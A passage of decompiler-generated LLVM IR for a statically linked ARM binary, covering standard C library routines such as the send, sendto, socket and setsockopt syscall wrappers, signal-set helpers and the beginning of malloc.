dec_label_pc_25560:                               ; preds = %entry, %dec_label_pc_25548
  %v1_25564 = phi i32 [ %v0_25538, %entry ], [ -1, %dec_label_pc_25548 ]
  %v2_25560 = phi i32 [ %v3_2552c, %entry ], [ %v2_25560.pre, %dec_label_pc_25548 ]
  store i32 %v2_25560, i32* @r7, align 4
  ret i32 %v1_25564

; uselistorder directives
  uselistorder i32 %v0_25538, { 1, 0, 2 }
  uselistorder label %dec_label_pc_25560, { 1, 0 }
}

define i32 @"$d.6"(i32 %arg1, i64* %arg2) local_unnamed_addr {
dec_label_pc_25568:
  %v0_25568 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_25568, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_25568
  %tmp = ptrtoint i64* %arg2 to i32
  %v6_25568 = udiv i32 %tmp, 4
  %v7_25568 = and i32 %v6_25568, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_25568, %bb
  %v12_2556c = phi i32 [ %arg1, %dec_label_pc_25568 ], [ %v7_25568, %bb ]
  ret i32 %v12_2556c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_25574 = load i32, i32* @r4, align 4
  store i32 %v3_25574, i32* %stack_var_-24, align 4
  %v6_25574 = load i32, i32* @r5, align 4
  %v9_25574 = load i32, i32* @r6, align 4
  %v12_25574 = load i32, i32* @r7, align 4
  %v15_25574 = load i32, i32* @r8, align 4
  %v18_25574 = load i32, i32* @lr, align 4
  %v4_25580 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 29852) to i32*), align 4
  %v2_25584 = icmp eq i32 %v4_25580, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_25584, label %dec_label_pc_2559c, label %entry.dec_label_pc_255a4_crit_edge

entry.dec_label_pc_255a4_crit_edge:               ; preds = %entry
  br label %dec_label_pc_255a4

dec_label_pc_2559c:                               ; preds = %entry
  store i32 %v3_25574, i32* @r4, align 4
  store i32 %v9_25574, i32* @r6, align 4
  store i32 %v12_25574, i32* @r7, align 4
  store i32 %v15_25574, i32* @r8, align 4
  %v0_255a0 = call i32 @__sys_send()
  br label %dec_label_pc_255a4

dec_label_pc_255a4:                               ; preds = %entry.dec_label_pc_255a4_crit_edge, %dec_label_pc_2559c
  %v0_255a4 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_255a4, i32* @r5, align 4
  %v0_255b8 = load i32, i32* @r4, align 4
  store i32 %v0_255b8, i32* @r0, align 4
  %v0_255bc = call i32 @__sys_send()
  store i32 %v0_255bc, i32* @r4, align 4
  %v0_255c4 = load i32, i32* @r5, align 4
  %v1_255c8 = call i32 @__libc_disable_asynccancel(i32 %v0_255c4)
  %v0_255cc = load i32, i32* @r4, align 4
  %v2_255d0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_255d0, i32* @r4, align 4
  store i32 %v6_25574, i32* @r5, align 4
  store i32 %v9_25574, i32* @r6, align 4
  store i32 %v12_25574, i32* @r7, align 4
  store i32 %v15_25574, i32* @r8, align 4
  store i32 %v18_25574, i32* @lr, align 4
  ret i32 %v0_255cc

; uselistorder directives
  uselistorder label %dec_label_pc_255a4, { 1, 0 }
}

define i32 @__sys_sendto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_255e0 = load i32, i32* @r4, align 4
  store i32 %v3_255e0, i32* %stack_var_-16, align 4
  %v0_255f4 = load i32, i32* @r0, align 4
  store i32 %v0_255f4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_255f4, -4095
  br i1 %tmp, label %dec_label_pc_2561c, label %dec_label_pc_25604

dec_label_pc_25604:                               ; preds = %entry
  %v0_25608 = call i32 @__aeabi_read_tp()
  %v3_2560c = load i16, i16* @global_var_42934.3040, align 2
  %v4_2560c = sext i16 %v3_2560c to i32
  %v0_25610 = load i32, i32* %r2.global-to-local, align 4
  %v1_25610 = sub i32 0, %v0_25610
  store i32 %v1_25610, i32* %r2.global-to-local, align 4
  %v3_25614 = add i32 %v4_2560c, %v0_25608
  %v4_25614 = inttoptr i32 %v3_25614 to i32*
  store i32 %v1_25610, i32* %v4_25614, align 4
  %v2_2561c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_2561c

dec_label_pc_2561c:                               ; preds = %entry, %dec_label_pc_25604
  %v1_25620 = phi i32 [ %v0_255f4, %entry ], [ -1, %dec_label_pc_25604 ]
  %v2_2561c = phi i32 [ %v3_255e0, %entry ], [ %v2_2561c.pre, %dec_label_pc_25604 ]
  store i32 %v2_2561c, i32* @r4, align 4
  ret i32 %v1_25620

; uselistorder directives
  uselistorder i32 %v0_255f4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2561c, { 1, 0 }
}

define i32 @"$d.5"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_25624:
  %v0_25624 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_25624, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_25624
  %v5_25624 = udiv i32 %arg3, 4
  %v6_25624 = and i32 %v5_25624, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_25624, %bb
  %v7_25628 = phi i32 [ %arg1, %dec_label_pc_25624 ], [ %v6_25624, %bb ]
  ret i32 %v7_25628

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_2562c = load i32, i32* @r4, align 4
  store i32 %v3_2562c, i32* %stack_var_-32, align 4
  %v6_2562c = load i32, i32* @r5, align 4
  %v9_2562c = load i32, i32* @r6, align 4
  %v12_2562c = load i32, i32* @r7, align 4
  %v15_2562c = load i32, i32* @r8, align 4
  %v18_2562c = load i32, i32* @sb, align 4
  %v21_2562c = load i32, i32* @sl, align 4
  %v24_2562c = load i32, i32* @lr, align 4
  %v4_2563c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 29852) to i32*), align 4
  %v2_25644 = icmp eq i32 %v4_2563c, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_25644, label %dec_label_pc_25664, label %dec_label_pc_25670

dec_label_pc_25664:                               ; preds = %entry
  store i32 %v3_2562c, i32* @r4, align 4
  store i32 %v12_2562c, i32* @r7, align 4
  store i32 %v15_2562c, i32* @r8, align 4
  store i32 %v18_2562c, i32* %sb.global-to-local, align 4
  %v0_2566c = call i32 @__sys_sendto()
  br label %dec_label_pc_25670

dec_label_pc_25670:                               ; preds = %entry, %dec_label_pc_25664
  %v0_25670 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_25670, i32* @r5, align 4
  %v0_25684 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_25684, i32* @r0, align 4
  %v0_2568c = call i32 @__sys_sendto()
  store i32 %v0_2568c, i32* @r4, align 4
  %v0_25694 = load i32, i32* @r5, align 4
  %v1_25698 = call i32 @__libc_disable_asynccancel(i32 %v0_25694)
  %v0_2569c = load i32, i32* @r4, align 4
  %v2_256a4 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_256a4, i32* @r4, align 4
  store i32 %v6_2562c, i32* @r5, align 4
  store i32 %v9_2562c, i32* @r6, align 4
  store i32 %v12_2562c, i32* @r7, align 4
  store i32 %v15_2562c, i32* @r8, align 4
  store i32 %v18_2562c, i32* @sb, align 4
  store i32 %v21_2562c, i32* @sl, align 4
  store i32 %v24_2562c, i32* @lr, align 4
  ret i32 %v0_2569c

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_25670, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_256b4 = load i32, i32* @r4, align 4
  store i32 %v3_256b4, i32* %stack_var_-12, align 4
  %v0_256c4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_256c4, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_256c4, -4095
  br i1 %tmp, label %dec_label_pc_256ec, label %dec_label_pc_256d4

dec_label_pc_256d4:                               ; preds = %entry
  %v0_256d8 = call i32 @__aeabi_read_tp()
  %v3_256dc = load i16, i16* @global_var_42934.3040, align 2
  %v4_256dc = sext i16 %v3_256dc to i32
  %v0_256e0 = load i32, i32* @r2, align 4
  %v1_256e0 = sub i32 0, %v0_256e0
  store i32 %v1_256e0, i32* @r2, align 4
  %v3_256e4 = add i32 %v4_256dc, %v0_256d8
  %v4_256e4 = inttoptr i32 %v3_256e4 to i32*
  store i32 %v1_256e0, i32* %v4_256e4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_256ec.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_256ec

dec_label_pc_256ec:                               ; preds = %entry, %dec_label_pc_256d4
  %v1_256f0 = phi i32 [ %v0_256c4, %entry ], [ -1, %dec_label_pc_256d4 ]
  %v2_256ec = phi i32 [ %v3_256b4, %entry ], [ %v2_256ec.pre, %dec_label_pc_256d4 ]
  store i32 %v2_256ec, i32* @r4, align 4
  ret i32 %v1_256f0

; uselistorder directives
  uselistorder i32 %v0_256c4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_256ec, { 1, 0 }
}

define i32 @"$d.4"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_256f4:
  %v0_256f4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_256f4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_256f4
  %v2_256f4 = load i32, i32* @r6, align 4
  %v5_256f4 = udiv i32 %v2_256f4, 4
  %v6_256f4 = and i32 %v5_256f4, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_256f4, %bb
  %v10_256f8 = phi i32 [ %arg1, %dec_label_pc_256f4 ], [ %v6_256f4, %bb ]
  ret i32 %v10_256f8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_256fc = load i32, i32* @r7, align 4
  store i32 %v3_256fc, i32* %stack_var_-8, align 4
  %v0_25708 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_25708, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_25708, -4095
  br i1 %tmp, label %dec_label_pc_25730, label %dec_label_pc_25718

dec_label_pc_25718:                               ; preds = %entry
  %v0_2571c = call i32 @__aeabi_read_tp()
  %v3_25720 = load i16, i16* @global_var_42934.3040, align 2
  %v4_25720 = sext i16 %v3_25720 to i32
  %v0_25724 = load i32, i32* @r2, align 4
  %v1_25724 = sub i32 0, %v0_25724
  store i32 %v1_25724, i32* @r2, align 4
  %v3_25728 = add i32 %v4_25720, %v0_2571c
  %v4_25728 = inttoptr i32 %v3_25728 to i32*
  store i32 %v1_25724, i32* %v4_25728, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_25730.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_25730

dec_label_pc_25730:                               ; preds = %entry, %dec_label_pc_25718
  %v1_25734 = phi i32 [ %v0_25708, %entry ], [ -1, %dec_label_pc_25718 ]
  %v2_25730 = phi i32 [ %v3_256fc, %entry ], [ %v2_25730.pre, %dec_label_pc_25718 ]
  store i32 %v2_25730, i32* @r7, align 4
  ret i32 %v1_25734

; uselistorder directives
  uselistorder i32 %v0_25708, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_25730, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_25738:
  %v0_25738 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_25738, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_25738
  %v2_25738 = load i32, i32* @sb, align 4
  %v8_25738 = shl i32 %v2_25738, %arg2
  %v9_25738 = and i32 %v8_25738, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_25738, %bb
  %v7_2573c = phi i32 [ %arg1, %dec_label_pc_25738 ], [ %v9_25738, %bb ]
  ret i32 %v7_2573c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  br i1 %tmp4, label %dec_label_pc_25758, label %dec_label_pc_25750

dec_label_pc_25750:                               ; preds = %entry
  %v7_25754 = icmp slt i32 %arg1, 65
  br i1 %v7_25754, label %dec_label_pc_25774, label %dec_label_pc_25758

dec_label_pc_25758:                               ; preds = %dec_label_pc_25750, %entry
  %v0_2575c = call i32 @__aeabi_read_tp()
  %v3_25760 = load i16, i16* @global_var_42934.3040, align 2
  %v4_25760 = sext i16 %v3_25760 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_2576c = add i32 %v4_25760, %v0_2575c
  %v4_2576c = inttoptr i32 %v3_2576c to i32*
  store i32 22, i32* %v4_2576c, align 4
  %v0_2577c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2577c

dec_label_pc_25774:                               ; preds = %dec_label_pc_25750
  %v0_25774 = call i32 @__sigaddset()
  store i32 %v0_25774, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2577c

dec_label_pc_2577c:                               ; preds = %dec_label_pc_25758, %dec_label_pc_25774
  %v0_2577c = phi i32 [ %v0_2577c.pre, %dec_label_pc_25758 ], [ %v0_25774, %dec_label_pc_25774 ]
  ret i32 %v0_2577c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2577c, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_25798 = add i32 %tmp, 4
  %v3_25798 = inttoptr i32 %v2_25798 to i32*
  store i32 0, i32* %v3_25798, align 4
  %v1_2579c = load i32, i32* %r3.global-to-local, align 4
  %v2_2579c = inttoptr i32 %v1_2579c to i32*
  store i32 0, i32* %v2_2579c, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_257a4 = load i32, i32* @r4, align 4
  store i32 %v3_257a4, i32* %stack_var_-16, align 4
  %v6_257a4 = load i32, i32* @r5, align 4
  %v9_257a4 = load i32, i32* @r6, align 4
  %v7_257ac = icmp eq i32 %arg2, -1
  br i1 %v7_257ac, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_257b4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_257d0

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_257d8

dec_label_pc_257d0:                               ; preds = %bb
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r6, align 4
  %v7_257d4 = icmp slt i32 %arg1, 65
  br i1 %v7_257d4, label %dec_label_pc_257f4, label %dec_label_pc_257d8

dec_label_pc_257d8:                               ; preds = %.thread16, %dec_label_pc_257d0
  %v0_257dc = call i32 @__aeabi_read_tp()
  %v3_257e0 = load i16, i16* @global_var_42934.3040, align 2
  %v4_257e0 = sext i16 %v3_257e0 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_257ec = add i32 %v4_257e0, %v0_257dc
  %v4_257ec = inttoptr i32 %v3_257ec to i32*
  store i32 22, i32* %v4_257ec, align 4
  %v0_2584c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb33

dec_label_pc_257f4:                               ; preds = %dec_label_pc_257d0
  %v2_257f4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_257f4, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_257fc = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_257fc, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_2580c = call i32 @__sigaddset()
  %v0_25814 = load i32, i32* @r5, align 4
  store i32 %v0_25814, i32* %r1.global-to-local, align 4
  %v0_25818 = load i32, i32* @r6, align 4
  %v2_25818 = add i32 %v0_25818, 28948
  %v2_2581c = call i32 @__GI___sigismember(i32 %v2_25818, i32 %v0_25814)
  store i32 %v2_257f4, i32* %r1.global-to-local, align 4
  %v0_25830 = load i32, i32* @r5, align 4
  %v3_2583c = call i32 @__libc_sigaction(i32 %v0_25830, i32 %v2_257f4, i32 %v2_257b4)
  %v1_25840 = icmp slt i32 %v3_2583c, 0
  br i1 %v1_25840, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_257f4
  %v5_25844 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_25844, i32* %r1.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_257f4
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_257d8, %bb32
  %v0_2584c = phi i32 [ %v5_25844, %bb31 ], [ %v0_2584c.pre, %dec_label_pc_257d8 ], [ -1, %bb32 ]
  %v2_25854 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_25854, i32* @r4, align 4
  store i32 %v6_257a4, i32* @r5, align 4
  store i32 %v9_257a4, i32* @r6, align 4
  ret i32 %v0_2584c

; uselistorder directives
  uselistorder i32 %v2_257f4, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 65, { 1, 2, 4, 3, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 3, 0, 2 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_257d8, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_25868 = add i32 %arg2, -1
  %v3_2586c = udiv i32 %v1_25868, 32
  %v4_25870 = mul nuw nsw i32 %v3_2586c, 4
  %v5_25870 = add i32 %v4_25870, %arg1
  %v6_25870 = inttoptr i32 %v5_25870 to i32*
  %v7_25870 = load i32, i32* %v6_25870, align 4
  %v1_25874 = urem i32 %v1_25868, 32
  %v7_2587c = shl i32 1, %v1_25874
  %v8_2587c = and i32 %v7_25870, %v7_2587c
  %v10_2587c = icmp ne i32 %v8_2587c, 0
  %. = zext i1 %v10_2587c to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_25868, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_2588c = load i32, i32* @r1, align 4
  %v1_2588c = add i32 %v0_2588c, -1
  %v3_25890 = udiv i32 %v1_2588c, 32
  %v0_25894 = load i32, i32* @r0, align 4
  %v4_25894 = mul nuw nsw i32 %v3_25890, 4
  %v5_25894 = add i32 %v0_25894, %v4_25894
  %v6_25894 = inttoptr i32 %v5_25894 to i32*
  %v7_25894 = load i32, i32* %v6_25894, align 4
  %v1_25898 = urem i32 %v1_2588c, 32
  %v7_258a0 = shl i32 1, %v1_25898
  %v8_258a0 = or i32 %v7_25894, %v7_258a0
  store i32 %v8_258a0, i32* %v6_25894, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_2588c, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_258b0 = add i32 %arg2, -1
  %v3_258b4 = udiv i32 %v1_258b0, 32
  %v4_258b8 = mul nuw nsw i32 %v3_258b4, 4
  %v5_258b8 = add i32 %v4_258b8, %arg1
  %v6_258b8 = inttoptr i32 %v5_258b8 to i32*
  %v7_258b8 = load i32, i32* %v6_258b8, align 4
  %v1_258bc = urem i32 %v1_258b0, 32
  %tmp = shl i32 -1, %v1_258bc
  %v8_258c4 = add i32 %tmp, -1
  %v9_258c4 = and i32 %v7_258b8, %v8_258c4
  store i32 %v9_258c4, i32* %v6_258b8, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_258b0, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_258d4 = udiv i32 %arg1, 256
  store i32 %v3_258d4, i32* %r1.global-to-local, align 4
  %v2_258d8 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_258d8, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_258e4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_258d8, i32 %v0_258e4)
  %v0_258e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_258e8 = add i32 %v0_258e8, 1048320
  %v3_258ec = udiv i32 %v1_258e8, 65536
  %v1_258f0 = and i32 %v3_258ec, 8
  %v6_258f4 = shl i32 %v0_258e8, %v1_258f0
  %v1_258f8 = add i32 %v6_258f4, 520192
  %v3_258fc = udiv i32 %v1_258f8, 65536
  %v1_25900 = and i32 %v3_258fc, 4
  %v6_25904 = shl i32 %v6_258f4, %v1_25900
  %v1_25908 = add i32 %v6_25904, 245760
  %v3_2590c = udiv i32 %v1_25908, 65536
  %v1_25910 = and i32 %v3_2590c, 2
  %v6_25914 = shl i32 %v6_25904, %v1_25910
  store i32 %v6_25914, i32* %r1.global-to-local, align 4
  %v1_25918 = sub nsw i32 13, %v1_258f0
  %v2_2591c = sub nsw i32 %v1_25918, %v1_25900
  %v3_25920 = udiv i32 %v6_25914, 32768
  %v4_25920 = sub nuw nsw i32 -1, %v3_25920
  %v4_25924 = udiv i32 %v6_25914, 16384
  %v5_25924 = and i32 %v4_25924, %v4_25920
  %v2_25928 = sub nsw i32 %v2_2591c, %v1_25910
  %v2_2592c = add nsw i32 %v2_25928, %v5_25924
  %v1_25930 = add nsw i32 %v2_2592c, 6
  %v0_25934 = load i32, i32* %ip.global-to-local, align 4
  %v6_25934 = lshr i32 %v0_25934, %v1_25930
  %v3_25938 = mul nsw i32 %v2_2592c, 4
  %v1_2593c = add nsw i32 %v3_25938, 32
  %v1_25940 = urem i32 %v6_25934, 4
  %v2_25944 = or i32 %v1_25940, %v1_2593c
  ret i32 %v2_25944

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_2594c = load i32, i32* @r4, align 4
  %v6_2594c = load i32, i32* @r5, align 4
  %v9_2594c = load i32, i32* @r6, align 4
  %v12_2594c = load i32, i32* @r7, align 4
  %v15_2594c = load i32, i32* @r8, align 4
  %v18_2594c = load i32, i32* @sb, align 4
  %v21_2594c = load i32, i32* @sl, align 4
  %v24_2594c = load i32, i32* @fp, align 4
  %v27_2594c = load i32, i32* @lr, align 4
  store i32 120, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r1.global-to-local, align 4
  %v4_25960 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 120) to i32*), align 4
  store i32 %v4_25960, i32* %r4.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_2596c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 76) to i32*), align 4
  store i32 %v4_2596c, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %v4_25960, i32* %r2.global-to-local, align 4
  %v2_25978 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_25978, i32* %r0.global-to-local, align 4
  store i32 124, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %ip.global-to-local, align 4
  %v4_25984 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 124) to i32*), align 4
  store i32 %v4_25984, i32* %ip.global-to-local, align 4
  store i32 154000, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_25984)
  %v0_25990 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_25990, i32* %r0.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r1.global-to-local, align 4
  %v4_2599c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 20) to i32*), align 4
  store i32 %v4_2599c, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_259a8.3185 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_2599c)
  %v0_259a8 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_259a8, -32
  br i1 %tmp, label %dec_label_pc_259cc, label %dec_label_pc_259b0

dec_label_pc_259b0:                               ; preds = %entry
  store i32 118644, i32* %r2.global-to-local, align 4
  %v0_259b4 = call i32 @__aeabi_read_tp()
  store i32 %v0_259b4, i32* %r0.global-to-local, align 4
  %v3_259b8 = load i16, i16* @global_var_42934.3040, align 2
  %v4_259b8 = sext i16 %v3_259b8 to i32
  store i32 %v4_259b8, i32* @r2, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_259c4 = add i32 %v4_259b8, %v0_259b4
  %v4_259c4 = inttoptr i32 %v3_259c4 to i32*
  store i32 12, i32* %v4_259c4, align 4
  br label %dec_label_pc_26250

dec_label_pc_259cc:                               ; preds = %entry
  %v1_259cc = add i32 %v0_259a8, 11
  store i32 %v1_259cc, i32* %r0.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r2.global-to-local, align 4
  %v2_259d8 = icmp ugt i32 %v1_259cc, 14
  %v7_259d8 = icmp eq i32 %v1_259cc, 15
  %v2_259dc = xor i1 %v7_259d8, true
  %v3_259dc = and i1 %v2_259d8, %v2_259dc
  br i1 %v3_259dc, label %bb, label %bb138

bb:                                               ; preds = %dec_label_pc_259cc
  %v5_259dc = and i32 %v1_259cc, -8
  store i32 %v5_259dc, i32* @sl, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_259cc, %bb
  %v4_259e0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 72) to i32*), align 4
  store i32 %v4_259e0, i32* @r0, align 4
  %v1_259e4 = inttoptr i32 %v4_259e0 to i32*
  %v2_259e4 = load i32, i32* %v1_259e4, align 4
  store i32 %v2_259e4, i32* @r4, align 4
  %v2_259e8 = xor i1 %v2_259d8, true
  %v3_259e8 = or i1 %v7_259d8, %v2_259e8
  br i1 %v3_259e8, label %bb139, label %bb140

bb139:                                            ; preds = %bb138
  store i32 16, i32* @sl, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_259ec = urem i32 %v2_259e4, 2
  %v2_259ec = icmp eq i32 %v1_259ec, 0
  br i1 %v2_259ec, label %dec_label_pc_259f4, label %dec_label_pc_25a04

